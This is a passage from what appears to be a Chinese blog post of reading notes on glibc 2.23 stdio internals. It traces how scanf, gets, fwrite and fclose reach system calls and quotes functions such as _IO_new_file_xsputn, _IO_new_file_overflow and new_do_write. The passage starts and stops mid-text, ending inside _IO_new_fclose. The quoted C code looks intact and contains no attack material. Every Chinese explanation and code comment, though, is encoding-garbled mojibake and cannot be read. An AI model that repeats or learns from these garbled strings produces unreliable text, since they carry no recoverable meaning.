c">read<br>_IO_new_file_underflow-&gt;_IO_doallocbuf-&gt;_IO_file_doallocate<br>__IO_default_uflow<br>__uflow<br>__vfscanf_internal<br>__isoc99_scanf<br></code></pre></td></tr></table></figure><h3 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h3><p>å’Œscanfå·®ä¸å¤š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">read<br>_IO_new_file_underflow-&gt;_IO_doallocbuf-&gt;_IO_file_doallocate<br>__IO_default_uflow<br>__uflow<br>gets<br></code></pre></td></tr></table></figure><h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><p>å‡½æ•°è°ƒç”¨æµç¨‹ï¼š</p><img src="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/fwrite.jpg" class title="fwrite"><p>æ‰§è¡Œfwriteå‡½æ•°å®é™…ä¸Šæ‰§è¡Œçš„æ˜¯_IO_writeå‡½æ•°ï¼Œ_IO_writeåˆè°ƒç”¨äº†_IO_sputn</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofwrite.c</span><br><br>_IO_size_t<br>_IO_fwrite (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t request = size * count;<br>  _IO_size_t written = <span class="hljs-number">0</span>;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (request == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span> || _IO_fwide (fp, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>)<br>    written = _IO_sputn (fp, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) buf, request);<br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">if</span> (written == request || written == EOF)<br>    <span class="hljs-keyword">return</span> count;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> written / size;<br>&#125;<br></code></pre></td></tr></table></figure><p>_IO_sputnå…¶å®æ˜¯è°ƒç”¨è·³è½¬è¡¨ä¸­çš„_IO_file_xsputnï¼ˆå®é™…ä¸Šæ˜¯_IO_new_file_xsputnï¼‰ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>å°†ç›®æ ‡æ•°æ®æ‹·è´è‡³è¾“å‡ºç¼“å†²åŒº</li><li>å¦‚æœç¼“å†²åŒºè¿˜æœ‰ç©ºé—´åˆ™å…ˆå§æ•°æ®æ‹·è´è¿›è¾“å‡ºç¼“å†²åŒº</li><li>å¦‚æœè¿˜æœ‰æ•°æ®å‰©ä½™åˆ™è¯´æ˜ç¼“å†²åŒºæœªå»ºç«‹æˆ–è€…ç¼“å†²åŒºå·²æ»¡ï¼Œè°ƒç”¨_IO_OVERFLOWå»ºç«‹æˆ–æ¸…ç©ºç¼“å†²åŒº</li><li>åˆ¤æ–­æ•°æ®æ˜¯å¦å¤§å—ï¼Œæ˜¯åˆ™å…ˆè°ƒç”¨new_do_writeè¾“å‡ºå°å—æ•°æ®ï¼Œç„¶åè°ƒç”¨_IO_default_xsputnå°†å‰©ä½™æ•°æ®æ‹·è´è¿›ç¼“å†²åŒº<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br>_IO_size_t<br>_IO_new_file_xsputn (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) data;<br>  _IO_size_t to_do = n;<br>  <span class="hljs-type">int</span> must_flush = <span class="hljs-number">0</span>;<br>  _IO_size_t count = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//è®¡ç®—ç¼“å†²åŒºç©ºé—´count</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *p;<br>  <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>    &#123;<br>      <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>&#123;<br>  count = p - s + <span class="hljs-number">1</span>;<br>  must_flush = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br>    &#125;<br>&#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)<br>    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <br><br><span class="hljs-comment">//å¦‚æœç¼“å†²åŒºè¿˜æœ‰ç©ºé—´åˆ™å…ˆæŠŠæ•°æ®æ‹·è´è¿›ç¼“å†²åŒº</span><br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count &gt; to_do)<br>count = to_do;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>      <span class="hljs-built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);<br>      f-&gt;_IO_write_ptr += count;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      s += count;<br>      to_do -= count;<br>    &#125;<br><span class="hljs-comment">//å¦‚æœè¿˜æœ‰æ•°æ®å‰©ä½™åˆ™è¯´æ˜ç¼“å†²åŒºæœªå»ºç«‹æˆ–å·²æ»¡</span><br>  <span class="hljs-keyword">if</span> (to_do + must_flush &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      _IO_size_t block_size, do_write;<br><span class="hljs-comment">//è°ƒç”¨_IO_OVERFLOWæ¸…ç©ºç¼“å†²åŒºæˆ–å»ºç«‹ç¼“å†²åŒº</span><br>      <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)<br><br><span class="hljs-keyword">return</span> to_do == <span class="hljs-number">0</span> ? EOF : n - to_do;<br><br><span class="hljs-comment">//æ£€æŸ¥æ•°æ®æ˜¯å¦å¤§å—ï¼Œæ˜¯åˆ™æ›´æ–°countä¸ºå°å—æ•°æ®æ•°é‡</span><br>      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;<br>      do_write = to_do - (block_size &gt;= <span class="hljs-number">128</span> ? to_do % block_size : <span class="hljs-number">0</span>);<br> <span class="hljs-comment">//è°ƒç”¨new_do_writeè¾“å‡ºsä¸­çš„å¤§å—æ•°æ®ï¼Œä¸ç»ç¼“å†²åŒº</span><br>      <span class="hljs-keyword">if</span> (do_write)<br>&#123;<br>  count = new_do_write (f, s, do_write);<br>  to_do -= count;<br>  <span class="hljs-keyword">if</span> (count &lt; do_write)<br>    <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br><br>      <span class="hljs-keyword">if</span> (to_do)<br>to_do -= _IO_default_xsputn (f, s+do_write, to_do);<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - to_do;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h2><p>_IO_OVERFLOWå®é™…ä¸Šå°±æ˜¯è·³è½¬è¡¨ä¸­çš„_IO_new_file_overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">int</span><br>_IO_new_file_overflow (_IO_FILE *f, <span class="hljs-type">int</span> ch)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="hljs-comment">/* SET ERROR */</span><br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">/* If currently reading or no buffer allocated. */</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span> || f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Allocate a buffer if needed. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">//å¦‚æœç¼“å†²åŒºæœªå»ºç«‹åˆ™è°ƒç”¨_IO_doallocbufå»ºç«‹ç¼“å†²åŒº</span><br>  _IO_doallocbuf (f);<br>  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);<br>&#125;<br><span class="hljs-comment">//å¦‚æœæœ‰backupåˆ™è°ƒç”¨backup</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))<br>&#123;<br>  <span class="hljs-type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;<br>  _IO_free_backup_area (f);<br>  f-&gt;_IO_read_base -= MIN (nbackup,<br>   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);<br>  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;<br>&#125;<br><span class="hljs-comment">//åˆå§‹åŒ–æŒ‡é’ˆ</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)<br>f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;<br>      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;<br>      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;<br>      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;<br>      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;<br><br>      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      <span class="hljs-keyword">if</span> (f-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;<br>    &#125;<br><span class="hljs-comment">//è°ƒç”¨_IO_do_writeæ¸…ç©ºç¼“å†²åŒºï¼Œæ³¨æ„ç¬¬äºŒä¸ªå‚æ•°æ˜¯f-&gt;_IO_write_base</span><br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  *f-&gt;_IO_write_ptr++ = ch;<br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)<br>      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="hljs-string">&#x27;\n&#x27;</span>))<br>    <span class="hljs-keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,<br>      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) ch;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-new-do-write"><a href="#IO-new-do-write" class="headerlink" title="_IO_new_do_write"></a>_IO_new_do_write</h3><p>_IO_do_writeå®é™…ä¸Šæ˜¯_IO_new_do_writeï¼ˆå®å®šä¹‰ï¼‰ï¼Œè°ƒç”¨äº†new_do_writeï¼Œ_IO_file_xsputnåç»­æ­¥éª¤ä¹Ÿè°ƒç”¨äº†è¿™ä¸ªå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">int</span><br>_IO_new_do_write (_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, _IO_size_t to_do)<br>&#123;<br>  <span class="hljs-keyword">return</span> (to_do == <span class="hljs-number">0</span><br>  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="hljs-number">0</span> : EOF;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="new-do-write"><a href="#new-do-write" class="headerlink" title="new_do_write"></a>new_do_write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">static</span><br>_IO_size_t<br><span class="hljs-title function_">new_do_write</span> <span class="hljs-params">(_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, _IO_size_t to_do)</span><br>&#123;<br><span class="hljs-comment">//ä¸€äº›åˆ¤æ–­</span><br>  _IO_size_t count;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)<br>    fp-&gt;_offset = _IO_pos_BAD;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      fp-&gt;_offset = new_pos;<br>    &#125;<br><span class="hljs-comment">//è°ƒç”¨_IO_SYSWRITEæ¸…ç©ºç¼“å†²åŒº</span><br>  count = _IO_SYSWRITE (fp, data, to_do);<br>  <span class="hljs-keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)<br>    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="hljs-number">1</span>, data, count) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//æ›´æ–°æŒ‡é’ˆ</span><br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))<br>       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-new-file-write"><a href="#IO-new-file-write" class="headerlink" title="_IO_new_file_write"></a>_IO_new_file_write</h3><p>_IO_SYSWRITEå®é™…ä¸Šå°±æ˜¯è·³è½¬è¡¨ä¸­çš„_IO_file_writeï¼ˆ_IO_new_file_writeï¼‰ï¼Œè°ƒç”¨ç³»ç»Ÿè°ƒç”¨æ¸…ç©ºç¼“å†²åŒº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br>_IO_ssize_t<br>_IO_new_file_write (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_ssize_t n)<br>&#123;<br>  _IO_ssize_t to_do = n;<br>  <span class="hljs-keyword">while</span> (to_do &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      _IO_ssize_t count = (__builtin_expect (f-&gt;_flags2<br>     &amp; _IO_FLAGS2_NOTCANCEL, <span class="hljs-number">0</span>)<br>   ? write_not_cancel (f-&gt;_fileno, data, to_do)<br>   : write (f-&gt;_fileno, data, to_do));<br>      <span class="hljs-keyword">if</span> (count &lt; <span class="hljs-number">0</span>)<br>&#123;<br>  f-&gt;_flags |= _IO_ERR_SEEN;<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br>      to_do -= count;<br>      data = (<span class="hljs-type">void</span> *) ((<span class="hljs-type">char</span> *) data + count);<br>    &#125;<br>  n -= to_do;<br>  <span class="hljs-keyword">if</span> (f-&gt;_offset &gt;= <span class="hljs-number">0</span>)<br>    f-&gt;_offset += n;<br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-default-xsputn"><a href="#IO-default-xsputn" class="headerlink" title="_IO_default_xsputn"></a>_IO_default_xsputn</h2><p>è°ƒç”¨_IO_OVERFLOWæ¸…ç©ºç¼“å†²åŒº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br>_IO_size_t<br>_IO_default_xsputn (_IO_FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s = (<span class="hljs-type">char</span> *) data;<br>  _IO_size_t more = n;<br>  <span class="hljs-keyword">if</span> (more &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>      <span class="hljs-comment">/* Space available. */</span><br>      <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)<br>&#123;<br>  _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">if</span> (count &gt; more)<br>    count = more;<br>  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">20</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">//è¾“å‡ºé•¿åº¦å¤§äº20ï¼Œè°ƒç”¨memcpyæ‹·è´</span><br>      <span class="hljs-built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);<br>      f-&gt;_IO_write_ptr += count;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      s += count;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (count)<br>    &#123;<br><span class="hljs-comment">//å°äº20ç›´æ¥èµ‹å€¼</span><br>      <span class="hljs-type">char</span> *p = f-&gt;_IO_write_ptr;<br>      _IO_ssize_t i;<br>      <span class="hljs-keyword">for</span> (i = count; --i &gt;= <span class="hljs-number">0</span>; )<br>*p++ = *s++;<br>      f-&gt;_IO_write_ptr = p;<br>    &#125;<br>  more -= count;<br>&#125;<br><span class="hljs-comment">//è°ƒç”¨_IO_OVERFLOWæ¸…ç©ºç¼“å†²åŒº</span><br>      <span class="hljs-keyword">if</span> (more == <span class="hljs-number">0</span> || _IO_OVERFLOW (f, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) *s++) == EOF)<br><span class="hljs-keyword">break</span>;<br>      more--;<br>    &#125;<br>  <span class="hljs-keyword">return</span> n - more;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„ä¸€ç‚¹"><a href="#æ³¨æ„ä¸€ç‚¹" class="headerlink" title="æ³¨æ„ä¸€ç‚¹"></a>æ³¨æ„ä¸€ç‚¹</h2><p>mainå‡½æ•°è¿”å›çš„æ—¶å€™_IO_cleanupä¼šè°ƒç”¨_IO_flush_all_lockpå‡½æ•°æœ€ç»ˆè°ƒç”¨ç³»ç»Ÿå‡½æ•°writeæ¸…ç©ºç¼“å†²åŒºä¹‹åè®¨è®º</p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><p>å‡½æ•°è°ƒç”¨æµç¨‹å›¾ï¼š</p><img src="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/fclose.jpg" class title="fclose"><p>fcloseå®é™…ä¸Šæ˜¯_IO_new_fclose</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofclose.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_fclose fclose</span><br></code></pre></td></tr></table></figure><p>_IO_new_fcloseå‡½æ•°çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è°ƒç”¨_IO_un_linkå°†fpä»_IO_list_allå•é“¾è¡¨ä¸­æ‘˜é™¤</li><li>è°ƒç”¨_IO_file_close_itå…³é—­æ–‡ä»¶å¹¶é‡Šæ”¾ç¼“å†²åŒº</li><li>è°ƒç”¨_IO_FINISHï¼ˆ_IO_new_file_finishï¼‰ç¡®å®š_IO_FILEå·²ä»é“¾è¡¨ä¸­å–å‡ºä¸”ç¼“å†²åŒºå·²é‡Šæ”¾</li><li>å¦‚æœfpä¸æ˜¯æ ‡å‡†è¾“å…¥ã€è¾“å‡ºæˆ–é”™è¯¯ï¼Œåˆ™é‡Šæ”¾fpç»“æ„ä½“<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofclose.c</span><br><br><span class="hljs-type">int</span><br>_IO_new_fclose (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-type">int</span> status;<br><br>  CHECK_FILE(fp, 